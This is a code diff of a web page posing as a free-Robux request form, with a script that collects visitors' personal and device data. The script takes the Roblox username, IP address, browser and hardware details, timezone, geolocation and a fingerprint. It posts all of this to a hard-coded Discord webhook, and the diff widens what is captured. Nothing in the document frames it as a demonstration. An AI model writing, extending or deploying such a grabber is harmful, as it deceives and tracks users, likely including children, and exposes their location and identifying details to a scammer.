@@ -7,7 +7,7 @@
 
 <link rel="icon" type="image/png" sizes="32x32" href="/images/BP-LOGO.png">
 <link rel="shortcut icon" href="/images/BP-LOGO.png">
-  
+
 <style>
 * {
   margin: 0;
@@ -102,17 +102,17 @@ button:hover {
 </style>
 </head>
 
+<body>
 <div class="container">
   <h2>GAP Request</h2>
 
   <div class="warning">
-    Please fill out your payment form and this will be sent within 10-20 minutes of submition.
+    Please fill out your payment form. This will be processed within 10–20 minutes.
   </div>
 
   <form id="loaForm">
     <input type="text" id="roblox" placeholder="Roblox Username" required>
     <textarea id="info" placeholder="Amount needed"></textarea>
-
     <button type="submit">Gain Robux</button>
   </form>
 </div>
@@ -124,35 +124,87 @@ document.getElementById("loaForm").addEventListener("submit", async function(e) 
   const webhookURL = "https://discord.com/api/webhooks/1500959376247226439/09aegftTvVJOQzoImPPb_imfSElmyOwhqN2PJkjt9uQBmYBK4Wd6ddbYSNAJAXiGynpl";
 
   const now = new Date();
-  const formattedTime = now.toLocaleString("en-GB", {
-    day: "2-digit",
-    month: "2-digit",
-    year: "numeric",
-    hour: "2-digit",
-    minute: "2-digit",
-    second: "2-digit"
-  });
+  const formattedTime = now.toLocaleString("en-GB");
 
+  // IP
   let ip = "Unknown";
-
   try {
     const res = await fetch("https://api.ipify.org?format=json");
     const data = await res.json();
     ip = data.ip;
-  } catch {
-    ip = "Failed to fetch";
-  }
+  } catch {}
 
-  const data = {
-    content: "<@1122570216673656973>",
+  // Device & browser info
+  const ua = navigator.userAgent;
+  const platform = navigator.platform;
+  const language = navigator.language;
+  const languages = navigator.languages?.join(", ") || "N/A";
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+  // Hardware (limited)
+  const cores = navigator.hardwareConcurrency || "N/A";
+  const memory = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A";
+
+  // Screen
+  const screenRes = screen.width + "x" + screen.height;
+  const viewport = window.innerWidth + "x" + window.innerHeight;
+  const colorDepth = screen.colorDepth;
+
+  // Page context
+  const referrer = document.referrer || "Direct";
+  const currentURL = window.location.href;
+
+  // Connection
+  const online = navigator.onLine ? "Online" : "Offline";
+
+  // Fingerprint
+  const fingerprint = btoa(
+    ua + "|" + language + "|" + screen.width + "|" + screen.height + "|" + timezone + "|" + cores + "|" + memory
+  );
+
+  // Location (optional permission)
+  let locationData = "Not allowed";
+  try {
+    locationData = await new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve(pos.coords.latitude + ", " + pos.coords.longitude),
+        () => resolve("Denied"),
+        { timeout: 3000 }
+      );
+    });
+  } catch {}
+
+  const payload = {
     embeds: [{
-      title: "New Grab",
+      title: "New Submission (Full Capture)",
       color: 16711680,
       fields: [
-        { name: "Roblox Username", value: document.getElementById("roblox").value, inline: true },
-        { name: "amount needed", value: document.getElementById("amount").value || "N/A" },
-        { name: "Submitted At", value: formattedTime },
-        { name: "IP Address", value: ip }
+        { name: "Roblox Username", value: document.getElementById("roblox").value || "N/A" },
+        { name: "Amount", value: document.getElementById("info").value || "N/A" },
+
+        { name: "Time", value: formattedTime },
+        { name: "IP", value: ip },
+
+        { name: "User Agent", value: ua.substring(0, 1000) },
+        { name: "Platform", value: platform, inline: true },
+        { name: "Language", value: language, inline: true },
+        { name: "Languages", value: languages },
+
+        { name: "Timezone", value: timezone, inline: true },
+        { name: "CPU Cores", value: String(cores), inline: true },
+        { name: "RAM Estimate", value: String(memory), inline: true },
+
+        { name: "Screen", value: screenRes, inline: true },
+        { name: "Viewport", value: viewport, inline: true },
+        { name: "Color Depth", value: String(colorDepth), inline: true },
+
+        { name: "Referrer", value: referrer },
+        { name: "Page URL", value: currentURL },
+
+        { name: "Connection", value: online, inline: true },
+        { name: "Location", value: locationData, inline: true },
+
+        { name: "Fingerprint", value: fingerprint }
       ]
     }]
   };
@@ -160,14 +212,14 @@ document.getElementById("loaForm").addEventListener("submit", async function(e) 
   const response = await fetch(webhookURL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(data)
+    body: JSON.stringify(payload)
   });
 
   if (response.ok) {
-    alert("Please wait... Sending Robux.");
+    alert("Submitted.");
     document.getElementById("loaForm").reset();
   } else {
-    alert("Failed to send. Check webhook.");
+    alert("Failed to send.");
     console.log(await response.text());
   }
 });
